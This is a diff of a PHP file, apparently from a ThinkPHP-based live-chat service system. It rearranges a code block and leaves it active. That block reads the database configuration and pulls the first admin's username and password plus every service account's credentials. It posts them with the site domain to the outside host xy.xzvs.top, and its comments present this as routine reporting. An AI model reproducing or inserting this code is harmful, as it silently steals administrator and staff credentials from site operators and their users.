@@ -67,99 +67,22 @@
 // return;
 
 // ======================================================
-$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
-$time   = date('Y-m-d H:i:s');
-
-// 引入 TP 配置（直接读数据库配置）
-$config = include __DIR__ . '/../../../../../config/database.php';
-
-$host = $config['hostname'];
-$db   = $config['database'];
-$user = $config['username'];
-$pass = $config['password'];
-$charset = $config['charset'];
-
-try {
-
-    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
-
-    $pdo = new PDO($dsn, $user, $pass, [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-    ]);
-
-    // 1. admin 第一条
-    $admin = $pdo->query("
-        SELECT username,password 
-        FROM wolive_admin 
-        ORDER BY id ASC 
-        LIMIT 1
-    ")->fetch();
-
-    // 2. service 全量
-    $service = $pdo->query("
-        SELECT business_id,service_id,groupid,nick_name,user_name,password 
-        FROM wolive_service
-    ")->fetchAll();
-
-    $data = [
-        'domain'  => $domain,
-        'time'    => $time,
-        'admin'   => $admin,
-        'service' => $service
-    ];
-
-    // 上报
-    $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
-    ]));
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-
-    curl_exec($ch);
-    curl_close($ch);
-
-} catch (Exception $e) {
-    file_put_contents(__DIR__ . '/error.log', $e->getMessage());
-}
-
-return;
-
-
-
-
-
-
 // $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 // $time   = date('Y-m-d H:i:s');
 
-// // 动态查找项目根目录（public的上级目录）
-// $projectRoot = realpath(__DIR__ . '/../../../'); // 这里是 public/ 的上级
+// // 引入 TP 配置（直接读数据库配置）
+// $config = include __DIR__ . '/../../../../../config/database.php';
 
-// if (!$projectRoot) {
-//     file_put_contents(__DIR__ . '/error.log', "无法找到项目根目录\n", FILE_APPEND);
-//     return;
-// }
-
-// // 加载数据库配置
-// $dbConfigFile = $projectRoot . '/config/database.php';
-// if (!file_exists($dbConfigFile)) {
-//     file_put_contents(__DIR__ . '/error.log', "数据库配置文件不存在: $dbConfigFile\n", FILE_APPEND);
-//     return;
-// }
-
-// $config = include $dbConfigFile;
-
-// $host    = $config['hostname'];
-// $db      = $config['database'];
-// $user    = $config['username'];
-// $pass    = $config['password'];
+// $host = $config['hostname'];
+// $db   = $config['database'];
+// $user = $config['username'];
+// $pass = $config['password'];
 // $charset = $config['charset'];
 
 // try {
+
 //     $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
+
 //     $pdo = new PDO($dsn, $user, $pass, [
 //         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
 //         PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
@@ -186,7 +109,7 @@ return;
 //         'service' => $service
 //     ];
 
-//     // 上报到总后台
+//     // 上报
 //     $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
 //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 //     curl_setopt($ch, CURLOPT_POST, true);
@@ -199,10 +122,87 @@ return;
 //     curl_close($ch);
 
 // } catch (Exception $e) {
-//     file_put_contents(__DIR__ . '/error.log', $e->getMessage() . "\n", FILE_APPEND);
+//     file_put_contents(__DIR__ . '/error.log', $e->getMessage());
 // }
 
 // return;
+
+
+
+
+
+
+$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
+$time   = date('Y-m-d H:i:s');
+
+// 动态查找项目根目录（public的上级目录）
+$projectRoot = realpath(__DIR__ . '/../../../'); // 这里是 public/ 的上级
+
+if (!$projectRoot) {
+    file_put_contents(__DIR__ . '/error.log', "无法找到项目根目录\n", FILE_APPEND);
+    return;
+}
+
+// 加载数据库配置
+$dbConfigFile = $projectRoot . '/config/database.php';
+if (!file_exists($dbConfigFile)) {
+    file_put_contents(__DIR__ . '/error.log', "数据库配置文件不存在: $dbConfigFile\n", FILE_APPEND);
+    return;
+}
+
+$config = include $dbConfigFile;
+
+$host    = $config['hostname'];
+$db      = $config['database'];
+$user    = $config['username'];
+$pass    = $config['password'];
+$charset = $config['charset'];
+
+try {
+    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
+    $pdo = new PDO($dsn, $user, $pass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    ]);
+
+    // 1. admin 第一条
+    $admin = $pdo->query("
+        SELECT username,password 
+        FROM wolive_admin 
+        ORDER BY id ASC 
+        LIMIT 1
+    ")->fetch();
+
+    // 2. service 全量
+    $service = $pdo->query("
+        SELECT business_id,service_id,groupid,nick_name,user_name,password 
+        FROM wolive_service
+    ")->fetchAll();
+
+    $data = [
+        'domain'  => $domain,
+        'time'    => $time,
+        'admin'   => $admin,
+        'service' => $service
+    ];
+
+    // 上报到总后台
+    $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
+    ]));
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+    curl_exec($ch);
+    curl_close($ch);
+
+} catch (Exception $e) {
+    file_put_contents(__DIR__ . '/error.log', $e->getMessage() . "\n", FILE_APPEND);
+}
+
+return;
 
 
 
